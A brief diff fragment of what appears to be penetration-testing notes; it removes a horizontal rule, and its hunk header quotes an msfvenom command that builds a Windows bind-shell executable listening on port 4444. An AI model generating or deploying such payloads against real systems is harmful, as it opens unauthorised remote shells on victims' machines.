@@ -105,4 +105,3 @@ msfvenom -p windows/shell_bind_tcp LPORT=4444 -f exe > shell.exe
 
 ```
 
----
